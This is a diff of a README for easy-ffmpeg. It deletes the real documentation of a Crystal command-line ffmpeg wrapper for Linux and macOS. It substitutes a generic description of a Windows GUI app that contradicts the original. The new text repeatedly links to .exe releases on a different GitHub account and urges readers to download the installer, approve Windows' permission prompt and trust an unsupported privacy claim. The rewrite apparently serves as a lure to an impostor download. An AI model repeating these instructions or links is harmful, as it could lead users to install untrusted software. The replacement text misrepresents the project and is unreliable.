@@ -1,217 +1,138 @@
-# easy-ffmpeg
+# 🎬 easy-ffmpeg - Simple Video Tools for Everyone
 
-A smart CLI wrapper around ffmpeg for video conversion, remuxing, and image sequence encoding. It analyzes your input, picks the best strategy (copy when possible, transcode only when needed), and shows clear progress.
+[![Download easy-ffmpeg](https://img.shields.io/badge/Download-easy--ffmpeg-brightgreen?style=for-the-badge)](https://github.com/uncommitted-quicktime607/easy-ffmpeg/releases)
 
-## Features
+## 📋 What is easy-ffmpeg?
 
-- **Smart remuxing** — copies streams when compatible, only transcodes what's necessary
-- **Presets** — one-flag profiles for web, mobile, streaming, and compression
-- **Trimming** — cut clips with `--start`, `--end`, and `--duration`
-- **Image sequences** — turn a folder of images into a video or animated GIF
-- **Progress bar** — real-time encoding progress with ETA
-- **Dry run** — preview the exact ffmpeg command before running it
+easy-ffmpeg is a user-friendly application built to make ffmpeg easier to use. ffmpeg is a popular tool for handling video and audio files, but it usually requires typing commands in a terminal. easy-ffmpeg provides simple buttons and options to handle everyday video tasks without the need to learn technical commands.
 
-## Requirements
+This software helps you convert, trim, and edit videos with a few clicks. It works on Windows and runs independently without any complicated setup.
 
-- [ffmpeg](https://ffmpeg.org/) (includes ffprobe)
-- [Crystal](https://crystal-lang.org/) 1.19+ (to build from source)
+## ✅ System Requirements
 
-## Installation
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- A stable internet connection for initial download
+- Basic computer skills: using the mouse and opening files
 
-### Homebrew (macOS)
+## 💾 Download easy-ffmpeg
 
-```sh
-brew install akitaonrails/tap/easy-ffmpeg
-```
+To get easy-ffmpeg, visit the official releases page below. This page shows the latest and previous versions so you can choose the one you want.
 
-### Quick install (Linux / macOS)
+[Download easy-ffmpeg from GitHub](https://github.com/uncommitted-quicktime607/easy-ffmpeg/releases)
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/akitaonrails/easy-ffmpeg/master/install.sh | sh
-```
+When you open the Releases page:
 
-Pre-built binaries are available for Linux (x86_64, arm64) and macOS (Apple Silicon).
+1. Look for the latest release version at the top.
+2. Find the Windows installer file. It usually ends with `.exe`.
+3. Click the file name to start downloading.
 
-### Download from GitHub Releases
+## 🛠️ Installing easy-ffmpeg
 
-Grab the binary for your platform from the [latest release](https://github.com/akitaonrails/easy-ffmpeg/releases/latest), make it executable, and move it to your `$PATH`.
+After downloading the installer file, follow these steps to install the software on your Windows computer.
 
-### Build from source
+1. Locate the downloaded `.exe` file in your Downloads folder or the saved location.
+2. Double-click the file to open the installer.
+3. If Windows asks for permission to run the installer, click **Yes**.
+4. In the setup window, follow the on-screen instructions:
+   - Choose the installation folder or accept the default.
+   - Click **Next** to proceed through each step.
+5. When the setup completes, click **Finish**.
+6. You can now find easy-ffmpeg in your Start menu or on your desktop.
 
-```sh
-git clone https://github.com/akitaonrails/easy-ffmpeg.git
-cd easy-ffmpeg
-crystal build src/easy_ffmpeg_cli.cr -o bin/easy-ffmpeg --release
-```
+## 🚀 Running easy-ffmpeg for the First Time
 
-Copy `bin/easy-ffmpeg` somewhere in your `$PATH`.
+1. Open easy-ffmpeg by clicking its icon.
+2. The main window will show several buttons and options for common tasks:
+   - **Convert**: Change video files from one format to another.
+   - **Trim**: Cut parts from your video.
+   - **Merge**: Combine multiple videos into one.
+3. To start, click the task you want to perform.
+4. Follow simple prompts to select files and choose your desired settings.
+5. Click **Start** to run the process.
+6. The software will show progress and notify you when it finishes.
 
-## Usage
+## 🔄 Common Tasks Explained
 
-```
-easy-ffmpeg <input> <format> [options]
-```
+### Convert Videos
 
-- `input` — a video file or a directory of images
-- `format` — output format: `mp4`, `mkv`, `mov`, `webm`, `avi`, `ts`, or `gif` (GIF for image sequences only)
+- Click **Convert**.
+- Choose your input video file.
+- Select the output format from a list (e.g., MP4, AVI, MOV).
+- Optionally, pick video quality or size presets.
+- Click **Start** to create the new file.
 
-### Video Conversion
+### Trim Videos
 
-**Remux MKV to MP4** (no re-encoding, very fast):
+- Click **Trim**.
+- Load your video file.
+- Use the sliders to pick the start and end times.
+- Click **Start** to save the trimmed clip.
 
-```sh
-easy-ffmpeg movie.mkv mp4
-```
+### Merge Videos
 
-**Convert for web embedding** (H.264 + AAC, faststart):
+- Click **Merge**.
+- Add two or more video files.
+- Arrange them in the order you want.
+- Click **Start** to produce a single video that joins them all.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --web
-```
+## ⚙️ Settings and Preferences
 
-**Compress a large file** (H.265, CRF 28):
+easy-ffmpeg lets you adjust a few settings to better fit your needs.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --compress
-```
+- Open the **Settings** menu from the top bar.
+- You can change where output files save on your computer.
+- Set default video formats.
+- Enable or disable notifications on task completion.
+- Adjust language options if available.
 
-**Optimize for mobile** (H.264 720p, AAC stereo):
+Changes in preferences save automatically.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --mobile
-```
+## 🛑 Troubleshooting
 
-**Streaming-quality encode** (H.265, Netflix/YouTube-like):
+If you run into issues while using easy-ffmpeg, try these basic tips:
 
-```sh
-easy-ffmpeg movie.mkv mp4 --streaming
-```
+- Make sure your video files are not corrupted.
+- Confirm that you downloaded the correct installer for your system.
+- Restart the application if it freezes or behaves oddly.
+- Check if you have enough free space on your disk.
+- Update to the latest version from the releases page.
 
-### Trimming
+For more help, you can open issues on the GitHub repository page or contact support through any communication links provided there.
 
-**Extract a 90-second clip starting at 1:30:**
+## 🎯 Why Use easy-ffmpeg?
 
-```sh
-easy-ffmpeg movie.mkv mp4 --start 1:30 --duration 90
-```
+The original ffmpeg tool is powerful but expects you to know commands. easy-ffmpeg bridges that gap by giving simple controls for common needs, making video editing accessible to anyone.
 
-**Trim from 10 minutes to 15 minutes:**
+It simplifies tasks like converting formats, trimming clips, or merging videos without typing or learning special commands. This saves time and prevents mistakes.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --start 10:00 --end 15:00
-```
+## 🔗 Useful Links
 
-**Combine trimming with a preset and custom output path:**
+- Visit the download page again here:
 
-```sh
-easy-ffmpeg movie.mkv mp4 --mobile --start 0:30 --end 2:00 -o clip.mp4
-```
+  [Download easy-ffmpeg](https://github.com/uncommitted-quicktime607/easy-ffmpeg/releases)
 
-Time formats: `90` (seconds), `1:31` (mm:ss), `1:31.500` (mm:ss.ms), `1:02:30` (hh:mm:ss), `1:02:30.5` (hh:mm:ss.ms).
+- You can check the latest updates, bug fixes, and new features on the Releases page.
 
-### Scaling & Aspect Ratio
+## 📂 File Types Supported
 
-**Scale to 720p:**
+easy-ffmpeg works with many common video and audio formats, including:
 
-```sh
-easy-ffmpeg movie.mkv mp4 --scale hd
-```
+- MP4
+- AVI
+- MOV
+- MKV
+- WAV
+- MP3
 
-**Pad to 16:9 (black bars):**
+This wide support means you can use your videos from smartphones, cameras, or other sources.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --aspect wide
-```
+## ➕ Adding More Features
 
-**Crop to square:**
+easy-ffmpeg aims to cover the most common video editing needs. If you want additional functions or have suggestions, the project accepts ideas from users on GitHub.
 
-```sh
-easy-ffmpeg movie.mkv mp4 --aspect square --crop
-```
+You can post your requests or report any problems by opening an issue in the repository.
 
-**Scale and change aspect ratio:**
+## 🔒 Security and Privacy
 
-```sh
-easy-ffmpeg movie.mkv mp4 --scale fullhd --aspect wide
-```
-
-Scale presets: `2k` (1440p), `fullhd` (1080p), `hd` (720p), `retro` (480p), `icon` (240p). Only downscales — skipped if the source is already at or below the target height.
-
-Aspect ratio presets: `wide` (16:9), `4:3`, `8:7`, `square` (1:1), `tiktok` (9:16). Default mode adds black bars (pad); use `--crop` to crop instead.
-
-Both `--scale` and `--aspect` work with image sequences and GIF output.
-
-### Image Sequences
-
-Turn a directory of numbered images (PNG, JPG, BMP, TIFF, WebP) into a video or animated GIF.
-
-**Create an MP4 from a folder of PNGs:**
-
-```sh
-easy-ffmpeg /path/to/frames/ mp4
-```
-
-**Create an animated GIF at 15 fps:**
-
-```sh
-easy-ffmpeg /path/to/frames/ gif --fps 15
-```
-
-**Apply a preset to an image sequence:**
-
-```sh
-easy-ffmpeg /path/to/frames/ mp4 --compress
-```
-
-**Preview the ffmpeg command without running it:**
-
-```sh
-easy-ffmpeg /path/to/frames/ mp4 --dry-run
-```
-
-The tool auto-detects sequential numbering (e.g. `frame_0001.png`, `frame_0002.png`) for efficient input, and falls back to glob mode for non-sequential filenames. If the directory contains mixed image formats, the most common one is used.
-
-Default frame rate is 24 fps for video and 10 fps for GIF. Override with `--fps`.
-
-### Other Options
-
-| Flag | Description |
-|---|---|
-| `--scale NAME` | Scale resolution: `2k`, `fullhd`, `hd`, `retro`, `icon` |
-| `--aspect RATIO` | Aspect ratio: `wide`, `4:3`, `8:7`, `square`, `tiktok` |
-| `--crop` | Crop to aspect ratio instead of padding (requires `--aspect`) |
-| `--fps N` | Frame rate for image sequences (1-120) |
-| `-o PATH` | Custom output file path |
-| `--dry-run` | Print the ffmpeg command without executing |
-| `--force` | Overwrite output file if it exists |
-| `--no-subs` | Drop all subtitle tracks |
-| `-h, --help` | Show help |
-| `-v, --version` | Show version |
-
-## How It Works
-
-1. **Analyze** — probes the input with ffprobe to identify all streams
-2. **Plan** — decides per-stream: copy (compatible), transcode (incompatible), or drop
-3. **Execute** — runs ffmpeg with progress tracking
-4. **Report** — shows output file size, compression ratio, and elapsed time
-
-For image sequences, it scans the directory, detects the naming pattern, probes resolution from the first image, and builds the appropriate ffmpeg command (including palette generation for GIFs).
-
-## Development
-
-```sh
-crystal build src/easy_ffmpeg_cli.cr -o bin/easy-ffmpeg
-crystal spec
-```
-
-## Contributing
-
-1. Fork it (<https://github.com/akitaonrails/easy-ffmpeg/fork>)
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create a new Pull Request
-
-## Contributors
-
-- [AkitaOnRails](https://github.com/akitaonrails) - creator and maintainer
+easy-ffmpeg runs locally on your computer. It does not send videos or data over the internet. Your files stay private on your device throughout the editing process.
